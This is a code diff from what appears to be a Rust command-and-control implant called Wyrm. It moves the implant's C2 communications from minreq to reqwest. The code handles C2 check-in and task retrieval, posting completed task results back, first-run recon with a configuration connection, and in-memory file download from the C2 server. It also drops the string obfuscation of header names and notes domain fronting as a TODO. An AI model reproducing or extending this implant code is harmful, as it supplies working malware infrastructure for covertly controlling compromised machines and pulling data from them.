@@ -1,18 +1,21 @@
 //! Implant communications are handled here.
 
-use std::{collections::HashMap, mem::take};
+use std::mem::take;
 
 use crate::{
     utils::{console::CONSOLE_LOG, time_utils::epoch_now},
     wyrm::Wyrm,
 };
-use minreq::Response;
+// use minreq::Response;
 use rand::Rng;
+use reqwest::{
+    blocking::Response,
+    header::{AUTHORIZATION, CONTENT_TYPE, HeaderMap, USER_AGENT, WWW_AUTHENTICATE},
+};
 use shared::{
     net::{TasksNetworkStream, XorEncode, decode_http_response, encode_u16buf_to_u8buf},
     tasks::{Command, Task},
 };
-use str_crypter::{decrypt_string, sc};
 
 /// Constructs the C2 URL by randomly choosing the URI to visit.
 fn construct_c2_url(implant: &Wyrm) -> String {
@@ -43,7 +46,7 @@ fn construct_c2_url(implant: &Wyrm) -> String {
 }
 
 /// Checks in with the C2 and gets any pending tasks.
-pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, minreq::Error> {
+pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest::Error> {
     let formatted_url = construct_c2_url(implant);
     let sec_token = &implant.c2_config.security_token;
     let ua = &implant.c2_config.useragent;
@@ -74,11 +77,12 @@ pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, minreq::Erro
 
     // If response was not OK; then just sleep. In the future maybe we have a strategy to exit after x
     // bad requests?
-    if response.status_code != 200 {
+    if response.status().as_u16() != 200 {
         #[cfg(debug_assertions)]
         println!(
             "[-] Status code was not OK 200. Got: {}. URL: {}",
-            response.status_code, formatted_url
+            response.status().as_u16(),
+            formatted_url
         );
 
         tasks.push(Task {
@@ -91,18 +95,21 @@ pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, minreq::Erro
         return Ok(tasks);
     }
 
-    Ok(decode_tasks_stream(response.as_bytes()))
+    let response_bytes = response.bytes().unwrap_or_default();
+    Ok(decode_tasks_stream(&response_bytes))
 }
 
-fn http_get(url: String, headers: HashMap<String, String>) -> Result<Response, minreq::Error> {
-    minreq::get(url).with_headers(headers).send()
+fn http_get(url: String, headers: HeaderMap) -> Result<Response, reqwest::Error> {
+    let client_builder = reqwest::blocking::ClientBuilder::new();
+    let client = client_builder.default_headers(headers).build()?;
+    client.get(url).send()
 }
 
 fn http_post_tasks(
     url: String,
     implant: &mut Wyrm,
-    headers: HashMap<String, String>,
-) -> Result<Response, minreq::Error> {
+    mut headers: HeaderMap,
+) -> Result<Response, reqwest::Error> {
     let mut completed_tasks: TasksNetworkStream = Vec::new();
 
     //
@@ -120,28 +127,24 @@ fn http_post_tasks(
     let serialised_post_body: Vec<u8> =
         serde_json::to_vec(&completed_tasks).expect("could not ser");
 
-    minreq::post(&url)
-        // .with_header("Host", host) -> TODO domain fronting?
-        .with_header("Content-Type", "application/json")
-        .with_headers(headers)
-        .with_body(serialised_post_body)
-        .send()
+    headers.insert(CONTENT_TYPE, "application/json".parse().unwrap());
+
+    let client_builder = reqwest::blocking::ClientBuilder::new();
+    let client = client_builder.default_headers(headers).build()?;
+
+    // TODO domain fronting in the above builder?
+    client.post(url).body(serialised_post_body).send()
 }
 
 /// Generates some generic headers which we send along with the HTTP request to the C2.
 /// These are to be the same for GET, POST, etc. Includes:
 ///
 /// - Implant ID
-fn generate_generic_headers(
-    implant_id: &str,
-    security_token: &str,
-    ua: &str,
-) -> HashMap<String, String> {
-    let mut headers = HashMap::new();
-
-    let _ = headers.insert(sc!("WWW-Authenticate", 74).unwrap(), implant_id.to_owned());
-    let _ = headers.insert(sc!("User-Agent", 42).unwrap(), ua.to_string());
-    let _ = headers.insert(sc!("authorization", 92).unwrap(), security_token.to_owned());
+fn generate_generic_headers(implant_id: &str, security_token: &str, ua: &str) -> HeaderMap {
+    let mut headers = HeaderMap::new();
+    headers.insert(WWW_AUTHENTICATE, implant_id.parse().unwrap());
+    headers.insert(USER_AGENT, ua.parse().unwrap());
+    headers.insert(AUTHORIZATION, security_token.parse().unwrap());
 
     headers
 }
@@ -176,7 +179,7 @@ pub fn decode_tasks_stream(byte_response: &[u8]) -> Vec<Task> {
 /// has for some reason, exit.
 ///
 /// Function pulls configuration settings down, and sends local config up where required for that first check-in.
-pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, minreq::Error> {
+pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest::Error> {
     implant.conduct_first_run_recon();
 
     //
@@ -194,11 +197,12 @@ pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, minreq:
     //
     let mut tasks: Vec<Task> = vec![];
 
-    if response.status_code != 200 {
+    if response.status().as_u16() != 200 {
         #[cfg(debug_assertions)]
         println!(
             "[-] Status code was not OK 200. Got: {}. Sent to: {}",
-            response.status_code, formatted_url,
+            response.status().as_u16(),
+            formatted_url,
         );
 
         tasks.push(Task {
@@ -211,7 +215,7 @@ pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, minreq:
         return Ok(tasks);
     }
 
-    Ok(decode_tasks_stream(response.as_bytes()))
+    Ok(decode_tasks_stream(&response.bytes().unwrap_or_default()))
 }
 
 /// Downloads a file to a buffer in memory
@@ -220,7 +224,7 @@ pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, minreq:
 /// As this function downloads a file **in memory**, ensure you are not downloading something massive with this
 /// as it will cause the device to run OOM. If that functionality is necessary, then make a streaming function which
 /// downloads to a file over a stream.
-pub fn download_file_with_uri_in_memory(uri: &str, wyrm: &Wyrm) -> Result<Vec<u8>, minreq::Error> {
+pub fn download_file_with_uri_in_memory(uri: &str, wyrm: &Wyrm) -> Result<Vec<u8>, reqwest::Error> {
     let formatted_url = format!("{}:{}{}", wyrm.c2_config.url, wyrm.c2_config.port, uri);
     let sec_token = &wyrm.c2_config.security_token;
     let ua = &wyrm.c2_config.useragent;
@@ -228,5 +232,5 @@ pub fn download_file_with_uri_in_memory(uri: &str, wyrm: &Wyrm) -> Result<Vec<u8
 
     let response = http_get(formatted_url, headers)?;
 
-    Ok(response.into_bytes())
+    Ok(response.bytes().unwrap_or_default().to_vec())
 }
